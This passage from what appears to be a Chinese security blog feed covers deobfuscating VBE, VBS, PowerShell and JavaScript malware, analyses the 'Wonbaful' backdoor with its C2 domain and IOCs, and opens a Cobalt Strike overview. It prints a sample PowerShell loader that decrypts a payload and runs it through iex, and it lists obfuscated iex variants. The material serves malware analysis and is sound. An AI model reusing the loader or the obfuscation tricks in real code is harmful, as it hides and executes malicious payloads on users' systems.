class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27;VBE decoder</span><br><span class="hljs-comment">&#x27;</span><br><span class="hljs-comment">&#x27;Decode all files encoded (original version) with screnc.exe</span><br><span class="hljs-comment">&#x27;This script give you a decoded listing from an encoded file.</span><br><span class="hljs-comment">&#x27;Supports *,je, ,vbe, .asp, .hta, .htm, .html…</span><br><span class="hljs-comment">&#x27;If used under cscript, puts the result to stdout.</span><br><span class="hljs-comment">&#x27;The file can be multi-encoded (many scripts in the file, for ex. in an html file)</span><br><span class="hljs-comment">&#x27;Used under wscript, pops up the decoded file in a message box.</span><br><span class="hljs-comment">&#x27;</span><br><span class="hljs-comment">&#x27;File Name : decovbe.vbs</span><br><span class="hljs-comment">&#x27;Requirement : none</span><br><span class="hljs-comment">&#x27;Author : Jean-Luc Antoine</span><br><span class="hljs-comment">&#x27;Submitted : 05/09/2001</span><br><span class="hljs-comment">&#x27;Updated : 09/12/2001</span><br><span class="hljs-comment">&#x27;Category : 4K</span><br><span class="hljs-comment">&#x27;</span><br><span class="hljs-comment">&#x27;http://www.interclasse.com/scripts/decovbe.php</span><br><br><span class="hljs-keyword">option</span> <span class="hljs-keyword">explicit</span><br><span class="hljs-keyword">Dim</span> oArgs, NomFichier, a<br><span class="hljs-comment">&#x27;Optional argument : the encoded filename</span><br>NomFichier=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">Set</span> oArgs = WScript.Arguments<br><span class="hljs-keyword">Select</span> <span class="hljs-keyword">Case</span> oArgs.Count<br><span class="hljs-keyword">Case</span> <span class="hljs-number">0</span> <span class="hljs-comment">&#x27;No Arg, popup a dialog box to choose the file</span><br>NomFichier=BrowseForFolder(<span class="hljs-string">&quot;Choose an encoded file&quot;</span>, &amp;H4031, &amp;H0011)<br><span class="hljs-keyword">Case</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">If</span> <span class="hljs-built_in">Instr</span>(oArgs(<span class="hljs-number">0</span>),<span class="hljs-string">&quot;?&quot;</span>)=<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span> <span class="hljs-comment">&#x27;-? ou /? =&gt; aide</span><br>NomFichier=oArgs(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Case</span> <span class="hljs-keyword">Else</span><br>WScript.Echo <span class="hljs-string">&quot;Too many parameters&quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Select</span><br><span class="hljs-keyword">Set</span> oArgs = <span class="hljs-literal">Nothing</span><br><br><span class="hljs-keyword">If</span> NomFichier&lt;&gt;<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">Dim</span> fso<br><span class="hljs-keyword">Set</span> fso=WScript.<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><span class="hljs-keyword">If</span> fso.FileExists(NomFichier) <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">Dim</span> fic,contenu<br><span class="hljs-keyword">Set</span> fic = fso.OpenTextFile(NomFichier, <span class="hljs-number">1</span>)<br>Contenu=fic.readAll<br>fic.close<br><span class="hljs-keyword">Set</span> fic=<span class="hljs-literal">Nothing</span><br><br><span class="hljs-keyword">Const</span> TagInit=<span class="hljs-string">&quot;#@~^&quot;</span> <span class="hljs-comment">&#x27;#@~^awQAAA==</span><br><span class="hljs-keyword">Const</span> TagFin=<span class="hljs-string">&quot;==^#~@&quot;</span> <span class="hljs-comment">&#x27;&amp; chr(0)</span><br><span class="hljs-keyword">Dim</span> DebutCode, FinCode<br><span class="hljs-keyword">Do</span><br>FinCode=<span class="hljs-number">0</span><br>DebutCode=<span class="hljs-built_in">Instr</span>(Contenu,TagInit)<br><span class="hljs-keyword">If</span> DebutCode&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">If</span> (<span class="hljs-built_in">Instr</span>(DebutCode,Contenu,<span class="hljs-string">&quot;==&quot;</span>)-DebutCode)=<span class="hljs-number">10</span> <span class="hljs-keyword">Then</span> <span class="hljs-comment">&#x27;If &quot;==&quot; follows the tag</span><br>FinCode=<span class="hljs-built_in">Instr</span>(DebutCode,Contenu,TagFin)<br><span class="hljs-keyword">If</span> FinCode&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br>Contenu=<span class="hljs-built_in">Left</span>(Contenu,DebutCode<span class="hljs-number">-1</span>) &amp; _<br>Decode(<span class="hljs-built_in">Mid</span>(Contenu,DebutCode+<span class="hljs-number">12</span>,FinCode-DebutCode<span class="hljs-number">-12</span><span class="hljs-number">-6</span>)) &amp; _<br><span class="hljs-built_in">Mid</span>(Contenu,FinCode+<span class="hljs-number">6</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Loop</span> Until FinCode=<span class="hljs-number">0</span><br><span class="hljs-comment">&#x27;WScript.Echo Contenu     </span><br><span class="hljs-comment">&#x27;修改为生成1.txt文件</span><br><span class="hljs-keyword">Set</span> fso =<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><span class="hljs-keyword">Set</span> a = fso.CreateTextFile(<span class="hljs-string">&quot;1.TXT&quot;</span>, <span class="hljs-literal">True</span>)<br>a.WriteLine(Contenu)<br>a.Close <br><span class="hljs-keyword">Else</span><br>WScript.Echo Nomfichier &amp; <span class="hljs-string">&quot; not found&quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Set</span> fso=<span class="hljs-literal">Nothing</span><br><span class="hljs-keyword">Else</span><br>WScript.Echo <span class="hljs-string">&quot;Please give a filename&quot;</span><br>WScript.Echo <span class="hljs-string">&quot;Usage : &quot;</span> &amp; wscript.fullname  &amp; <span class="hljs-string">&quot; &quot;</span> &amp; WScript.ScriptFullName &amp; <span class="hljs-string">&quot; &lt;filename&gt;&quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">Function</span> Decode(Chaine)<br><span class="hljs-keyword">Dim</span> se,i,c,j,index,ChaineTemp<br><span class="hljs-keyword">Dim</span> tDecode(<span class="hljs-number">127</span>)<br><span class="hljs-keyword">Const</span> Combinaison=<span class="hljs-string">&quot;1231232332321323132311233213233211323231311231321323112331123132&quot;</span><br><br><span class="hljs-keyword">Set</span> se=WSCript.<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.Encoder&quot;</span>)<br><span class="hljs-keyword">For</span> i=<span class="hljs-number">9</span> <span class="hljs-keyword">to</span> <span class="hljs-number">127</span><br>tDecode(i)=<span class="hljs-string">&quot;JLA&quot;</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">For</span> i=<span class="hljs-number">9</span> <span class="hljs-keyword">to</span> <span class="hljs-number">127</span><br>ChaineTemp=<span class="hljs-built_in">Mid</span>(se.EncodeScriptFile(<span class="hljs-string">&quot;.vbs&quot;</span>,<span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>,i),<span class="hljs-number">0</span>,<span class="hljs-string">&quot;&quot;</span>),<span class="hljs-number">13</span>,<span class="hljs-number">3</span>)<br><span class="hljs-keyword">For</span> j=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">3</span><br>c=<span class="hljs-built_in">Asc</span>(<span class="hljs-built_in">Mid</span>(ChaineTemp,j,<span class="hljs-number">1</span>))<br>tDecode(c)=<span class="hljs-built_in">Left</span>(tDecode(c),j<span class="hljs-number">-1</span>) &amp; <span class="hljs-built_in">chr</span>(i) &amp; <span class="hljs-built_in">Mid</span>(tDecode(c),j+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-comment">&#x27;Next line we correct a bug, otherwise a &quot;)&quot; could be decoded to a &quot;&gt;&quot;</span><br>tDecode(<span class="hljs-number">42</span>)=<span class="hljs-built_in">Left</span>(tDecode(<span class="hljs-number">42</span>),<span class="hljs-number">1</span>) &amp; <span class="hljs-string">&quot;)&quot;</span> &amp; <span class="hljs-built_in">Right</span>(tDecode(<span class="hljs-number">42</span>),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">Set</span> se=<span class="hljs-literal">Nothing</span><br><br>Chaine=<span class="hljs-built_in">Replace</span>(<span class="hljs-built_in">Replace</span>(Chaine,<span class="hljs-string">&quot;@&amp;&quot;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">10</span>)),<span class="hljs-string">&quot;@#&quot;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">13</span>))<br>Chaine=<span class="hljs-built_in">Replace</span>(<span class="hljs-built_in">Replace</span>(Chaine,<span class="hljs-string">&quot;@*&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>),<span class="hljs-string">&quot;@!&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>)<br>Chaine=<span class="hljs-built_in">Replace</span>(Chaine,<span class="hljs-string">&quot;@$&quot;</span>,<span class="hljs-string">&quot;@&quot;</span>)<br>index=<span class="hljs-number">-1</span><br><span class="hljs-keyword">For</span> i=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">Len</span>(Chaine)<br>c=<span class="hljs-built_in">asc</span>(<span class="hljs-built_in">Mid</span>(Chaine,i,<span class="hljs-number">1</span>))<br><span class="hljs-keyword">If</span> c&lt;<span class="hljs-number">128</span> <span class="hljs-keyword">Then</span> index=index+<span class="hljs-number">1</span><br><span class="hljs-keyword">If</span> (c=<span class="hljs-number">9</span>) <span class="hljs-keyword">or</span> ((c&gt;<span class="hljs-number">31</span>) <span class="hljs-keyword">and</span> (c&lt;<span class="hljs-number">128</span>)) <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">If</span> (c&lt;&gt;<span class="hljs-number">60</span>) <span class="hljs-keyword">and</span> (c&lt;&gt;<span class="hljs-number">62</span>) <span class="hljs-keyword">and</span> (c&lt;&gt;<span class="hljs-number">64</span>) <span class="hljs-keyword">Then</span><br>Chaine=<span class="hljs-built_in">Left</span>(Chaine,i<span class="hljs-number">-1</span>) &amp; <span class="hljs-built_in">Mid</span>(tDecode(c),<span class="hljs-built_in">Mid</span>(Combinaison,(index mod <span class="hljs-number">64</span>)+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>) &amp; <span class="hljs-built_in">Mid</span>(Chaine,i+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Next</span><br>Decode=Chaine<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br><span class="hljs-keyword">Function</span> BrowseForFolder(<span class="hljs-keyword">ByVal</span> pstrPrompt, <span class="hljs-keyword">ByVal</span> pintBrowseType, <span class="hljs-keyword">ByVal</span> pintLocation)<br><span class="hljs-keyword">Dim</span> ShellObject, pstrTempFolder, x<br><span class="hljs-keyword">Set</span> ShellObject=WScript.<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Set</span> pstrTempFolder=ShellObject.BrowseForFolder(&amp;H0,pstrPrompt,pintBrowseType,pintLocation)<br>BrowseForFolder=pstrTempFolder.ParentFolder.ParseName(pstrTempFolder.Title).Path<br><span class="hljs-keyword">If</span> Err.Number&lt;&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span> BrowseForFolder=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">Set</span> pstrTempFolder=<span class="hljs-literal">Nothing</span><br><span class="hljs-keyword">Set</span> ShellObject=<span class="hljs-literal">Nothing</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br></code></pre></td></tr></table></figure><h2 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h2><p><strong>VBS</strong>可以使用msgbox、WScript.StdOut.WriteLine或者WScript.Echo方法</p><p>也可以使用notepad++插件NppExec进行调试，</p><p>或者执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">WScript  /x  vbsfile<br>CScript  /x  vbsfile<br></code></pre></td></tr></table></figure><p>调用VS进行调试</p><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p>Powershell脚本混淆的方法有很多，包括随机大小写、字符串拼接、简写与通配符、Ascii编码、Base64编码、逆序等等。</p><p>但是万变不离其宗，PowerShell脚本最后都要执行，都会用到<strong>iex（invoke-Expression）</strong>函数。</p><p>我们只需要找到代码中的iex、Invoke-Expression或者其他变形&amp;($psHOme[4]+$pshOme[34]+’x’) 、$Env:ComSpec[4,26,25]-Join’’、$ShellId[1]+$ShellId[13]+’x’ 、$EnV:cOmSPeC[4,24,25]-jOIn’’等，然后直接修改为<strong>Write-Output</strong>就可以了。</p><p>例如：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aes</span></span><br>&#123;<br><span class="hljs-keyword">param</span> ([<span class="hljs-built_in">String</span>]<span class="hljs-variable">$InputString</span>,<br>[<span class="hljs-built_in">String</span>]<span class="hljs-variable">$hash</span> = <span class="hljs-string">&quot;cVdA6gMCLBUrWK3mqhai24KhwaAufX7yN&quot;</span>)<br><br><br><span class="hljs-variable">$InputData</span> = [<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$InputString</span>)<br><br><span class="hljs-variable">$Salt</span> = <span class="hljs-built_in">New-Object</span> Byte[](<span class="hljs-number">32</span>)<br>[<span class="hljs-built_in">Array</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$InputData</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$Salt</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>)<br><span class="hljs-variable">$Rfc2898</span> = <span class="hljs-built_in">New-Object</span> System.Security.Cryptography.Rfc2898DeriveBytes(<span class="hljs-variable">$hash</span>, <span class="hljs-variable">$Salt</span>)<br><span class="hljs-variable">$AESKey</span> = <span class="hljs-variable">$Rfc2898</span>.GetBytes(<span class="hljs-number">32</span>)<br><span class="hljs-variable">$AESIV</span> = <span class="hljs-variable">$Rfc2898</span>.GetBytes(<span class="hljs-number">16</span>)<br><span class="hljs-variable">$Hmac</span> = <span class="hljs-built_in">New-Object</span> System.Security.Cryptography.HMACSHA1( ,<span class="hljs-variable">$Rfc2898</span>.GetBytes(<span class="hljs-number">20</span>))<br><br><span class="hljs-variable">$AuthCode</span> = <span class="hljs-variable">$Hmac</span>.ComputeHash(<span class="hljs-variable">$InputData</span>, <span class="hljs-number">52</span>, <span class="hljs-variable">$InputData</span>.Length - <span class="hljs-number">52</span>)<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">Compare-Object</span> <span class="hljs-variable">$AuthCode</span> (<span class="hljs-variable">$InputData</span>[<span class="hljs-number">32</span> <span class="hljs-type">..</span> <span class="hljs-number">51</span>]) <span class="hljs-literal">-SyncWindow</span> <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-string">&#x27;Checksum failure.&#x27;</span><br>&#125;<br><br><span class="hljs-variable">$AES</span> = <span class="hljs-built_in">New-Object</span> Security.Cryptography.RijndaelManaged<br><span class="hljs-variable">$AESDecryptor</span> = <span class="hljs-variable">$AES</span>.CreateDecryptor(<span class="hljs-variable">$AESKey</span>, <span class="hljs-variable">$AESIV</span>)<br><br><span class="hljs-variable">$DecryptedInputData</span> = <span class="hljs-variable">$AESDecryptor</span>.TransformFinalBlock(<span class="hljs-variable">$InputData</span>, <span class="hljs-number">52</span>, <span class="hljs-variable">$InputData</span>.Length - <span class="hljs-number">52</span>)<br><br><span class="hljs-variable">$DataStream</span> = <span class="hljs-built_in">New-Object</span> System.IO.MemoryStream(<span class="hljs-variable">$DecryptedInputData</span>, <span class="hljs-variable">$false</span>)<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$DecryptedInputData</span>[<span class="hljs-number">0</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>x1f)<br>&#123;<br><span class="hljs-variable">$DataStream</span> = <span class="hljs-built_in">New-Object</span> System.IO.Compression.GZipStream(<span class="hljs-variable">$DataStream</span>, [<span class="hljs-type">IO.Compression.CompressionMode</span>]::Decompress)<br>&#125;<br><br><span class="hljs-variable">$StreamReader</span> = <span class="hljs-built_in">New-Object</span> System.IO.StreamReader(<span class="hljs-variable">$DataStream</span>, <span class="hljs-variable">$true</span>)<br><span class="hljs-variable">$OutputString</span> = ([<span class="hljs-type">System.Text.Encoding</span>]::unicode.GetString([<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-variable">$StreamReader</span>.ReadToEnd())))<br><span class="hljs-built_in">iex</span> <span class="hljs-variable">$Outputstring</span><br>&#125;<br></code></pre></td></tr></table></figure><p>别看整个方法包括AES、Base64都在解密，但是最后还是要iex，所以直接修改iex为Write-Output，解密的代码就出来了。</p><p>具体情况具体分析，针对PowerShell脚本还可以通过自带的<em>Windows PowerShell ISE</em>，或者虚拟机开启系统PowerShell日志，各种行为监测软件，沙箱来进行分析。</p><p><strong>参考：</strong><a href="https://bbs.pediy.com/thread-253629.htm%E3%80%81https://www.52pojie.cn/thread-1543561-1-1.html%E3%80%81https://www.freebuf.com/articles/system/181697.html">https://bbs.pediy.com/thread-253629.htm、https://www.52pojie.cn/thread-1543561-1-1.html、https://www.freebuf.com/articles/system/181697.html</a></p><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>JS木马多种多样，有网页木马，也有主机木马。混淆方式也千奇百怪。</p><p>JS代码美化 <a href="https://beautifier.io/">https://beautifier.io/</a></p><p>基础反混淆 <a href="https://mindedsecurity.github.io/jstillery/">https://mindedsecurity.github.io/jstillery/</a></p><p>主要还是先静态分析代码逻辑，定位到关键的数据，然后通过各种方法解密这些数据。</p><p><strong>Web JavaScript：</strong></p><p>Chrome DevTools</p><p>alert()document.write()console.log()unescape()  </p><p><strong>Windows JavaScript：</strong></p><p>WScript.StdOut.WriteLine()WScript.Echo() </p><p><strong>Windows JavaScript</strong>的混淆加密也可以使用WScript.StdOut.WriteLine和WScript.Echo方法，它和<strong>VBS</strong>两者实际上都是调用WSH运行的。</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脚本木马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wonbaful后门分析</title>
    <link href="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    <url>/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一、样本信息"><a href="#一、样本信息" class="headerlink" title="一、样本信息"></a>一、样本信息</h2><table><thead><tr><th>文件名</th><th>beifen.bak</th></tr></thead><tbody><tr><td>MD5</td><td>EEAD5424C1738BD5061CF2455CEB45B7</td></tr><tr><td>SHA256</td><td>8fe4f4b4f7ea39f63465d1eff48a1079cbf0846fa27c00b45b596e898ae927b3</td></tr><tr><td>文件大小</td><td>151,440 字节</td></tr><tr><td>病毒类型</td><td>Backdoor:Win32&#x2F;Wonbaful.A</td></tr></tbody></table><p>经初步分析，上述恶意文件为PE文件格式的备份文件，修改后缀后实际为SFX自解压文件，可直接执行。</p><p>执行后会释放nsck.ocx（Microsoft Winsock Control DLL）和winmgmt.exe（后门程序主体）到“C:\Program Files\”，并执行winmgmt.exe。</p><p>winmgmt.exe主要功能为连接C&amp;C地址tyl007.3322.org，等待接受指令，指令包括获取受控主机名、执行DOS命令、弹窗、通过ftp获取文件等。</p><p>通过搜索相关特征值结合威胁情报，决定采用Microsoft的命名方式，将该恶意文件称为Wonbaful后门程序。详情如下：</p><img src="clip_image002.png" alt="img" style="zoom:80%;" /><center>beifen.bak实际为SFX自解压文件</center><img src="clip_image002-16519068197461.png" alt="img" style="zoom:80%;" /><center>beifen详情</center><h2 id="二、样本分析"><a href="#二、样本分析" class="headerlink" title="二、样本分析"></a>二、样本分析</h2><p>如上所示beifen.exe文件内包含两个PE文件，经分析nsck.ocx为微软官方的网络编程接口动态链接库文件，作用是为winmgmt.exe提供网络接口方法。</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002-16519068826252.png" alt="img"></p><center>数字签名</center><img src="clip_image002-16519069007603.png" alt="img" style="zoom:80%;" /><center>Virustotal详情</center><p>winmgmt.exe包含后门程序主体功能，使用Visual Basic编写，详细信息包含Autocad。</p><img src="clip_image002-16519069484734.png" alt="img" style="zoom:80%;" /><center>Visual Basic编写</center><img src="clip_image002-16519069713475.png" alt="img" style="zoom:67%;" /><center>详细信息</center><p>运行beifen.exe程序后,首先会释放上述两个文件（nsck.ocx、winmgmt.exe）到“C:\Program Files\”路径下，并启动winmgmt.exe。</p><img src="clip_image001.png" alt="img" style="zoom:67%;" /><center>释放文件</center><p>winmgmt.exe执行netsh命令，但命令格式有问题，sh应该为防火墙规则名，和指定端口之间应该有空格，不清楚原因。</p><img src="clip_image002-16519070330356.png" alt="img" style="zoom: 80%;" /><center>试图修改防火墙规则</center><p>通联C&amp;C地址tyl007.3322.org:9999,但TCP连接建立握手后被服务器关闭连接。经查域名tyl007.3322.org及DNS解析地址183.236.2.18均被标记恶意。初步认为tyl007.3322.org动态域名已被回收，解析地址为动态域名提供商网关地址。</p><img src="clip_image002-16519070801017.png" alt="img" style="zoom:80%;" /><img src="clip_image004.png" alt="img" style="zoom:80%;" /><center>尝试连接C&C地址</center><img src="clip_image002-16519071074718.png" alt="img" style="zoom:67%;" /><center>C2被标记为远控Wonbaful</center><img src="clip_image002-16519071261699.png" alt="img" style="zoom:67%;" /><center>疑似网关IP被大量标记</center><p>因为后门程序没有连接到远控端，很多功能看不到，只能对该程序进行静态反编译。</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002.jpg" alt="img"></p><center>样本结构</center><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002-165190719453310.png" alt="img"></p><center>尝试修改防火墙规则</center><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002-165190721272111.png" alt="img"></p><center>“(@)”分割的字符串</center><p>执行远控端haoma命令，对受控主机进行备注</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002-165190724569512.png" alt="img"></p><p>执行DOS命令</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image004-165190724569513.png" alt="img"></p><p>发起弹窗</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image006.png" alt="img"></p><p>通过ftp协议窃取文件</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image008.png" alt="img"></p><p>删除重启后门程序</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image010.png" alt="img"></p><h2 id="三、IOCs"><a href="#三、IOCs" class="headerlink" title="三、IOCs"></a>三、IOCs</h2><p><strong>MD5</strong>:</p><p>EEAD5424C1738BD5061CF2455CEB45B7</p><p>6CDE9FDAF329997DFA266EC903B46EE0</p><p><strong>C&amp;C</strong>:</p><p>tyl007.3322.org </p><p>183.236.2.18</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Wonbaful</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike学习</title>
    <link href="/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>比较流行的三款后渗透工具：</strong></p><p><a href="https://www.cobaltstrike.com/">Cobalt Strike</a>    <a href="https://www.metasploit.com/">Metasploit</a>  (图形化：Armitage)   <a href="https://github.com/BC-SECURITY/Empire">Empire</a></p><h2 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h2><p>Cobalt Strike是一款由Java编写的全平台多方协同渗透测试框架，在3.0版本之前它基于Metasploit框架工作，相当于增强版的Armitage，在3.0后的版本已独立成一个为目标攻击和模拟对抗而设计的渗透测试平台，主要用于执行有目标的攻击和模拟高级威胁者的后渗透行动。Cobalt Strike集成了端口转发、端口扫描、socket代理、提权、钓鱼、远控木马等功能。该工具几乎覆盖了APT攻击链中所需要用到的各个技术环节，且其最大的优点在于可以进行团队合作和优越的UI界面。</p><h2 id="Cobalt-Strike架构"><a href="#Cobalt-Strike架构" class="headerlink" title="Cobalt Strike架构"></a>Cobalt Strike架构</h2><p>Cobalt Strike分为<strong>服务器(TeamServer)<strong>组件和</strong>客户端(Client)<strong>组件。在Cobalt Strike工作中，服务器可以有多个，客户端也可以有多个，客户端与团队服务器是</strong>多对多</strong>的关系，实现了团队的分布式协作。</p><h3 id="团队服务器-TeamServer"><a href="#团队服务器-TeamServer" class="headerlink" title="团队服务器(TeamServer)"></a>团队服务器(TeamServer)</h3><p>服务器组件，也就是团队服务器，是Beacon payload的控制器，也是Cobalt Strike社会工程功能的托管主机。</p><p>团队服务器还存储由Cobalt Strike收集的数据，并管理日志记录。 </p><p>Cobalt Strike团队服务器必须在受支持的Linux系统上运行。要启动一个Cobalt Strike团队服务器，需要使用Cobalt Strike Linux安装包中的teamserver脚本文件。</p><h3 id="客户端-Client"><a href="#客户端-Client" class="headerlink" title="客户端(Client)"></a>客户端(Client)</h3><p>Cobalt Strike客户端是团队成员实现各种攻击功能的主体，也是Cobalt Strike的核心。</p><p>使用Cobalt Strike客户端，必须要连接至团队服务器，Cobalt Strike客户端支持Windows、Linux、MacOS多个平台。</p><h3 id="分布式的团队协作"><a href="#分布式的团队协作" class="headerlink" title="分布式的团队协作"></a>分布式的团队协作</h3><p>Cobalt Strike可以协同红队的分散行动，使用一个或更多的teamServer并让你的团队与其建立连接，分阶段的筹划整个攻击流程。</p><p>一旦连接至同一个teamServer，client将：</p><ol><li>使用相同的会话</li><li>分享主机、捕获的数据和下载的文件</li><li>通过一个共享的事件日志交流</li></ol><p>当连接到多个团队服务器，Cobalt Strike客户端会汇总所有它连接的团队服务器的监听器。这种聚合允许攻击者从一台团队服务器引用托管在另一台团队服务器上的恶意网站、钓鱼邮件等资源。在你行动的末期，Cobalt Strike的报告功能会查询所有你连接到的团队服务器，合并这些数据来描述一个完整的事件。</p><p><img src="/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/%E5%A4%9A%E5%8F%B0%E5%9B%A2%E9%98%9F%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt="多台团队服务器"></p><p><strong>架构多台团队服务器(例如钓鱼、攻击、后渗透、持久化)，也就是分解整个攻击链，这是分布式行动模型的基本思想。</strong></p><h2 id="启动Cobalt-Strike"><a href="#启动Cobalt-Strike" class="headerlink" title="启动Cobalt Strike"></a>启动Cobalt Strike</h2><h3 id="启动团队服务器"><a href="#启动团队服务器" class="headerlink" 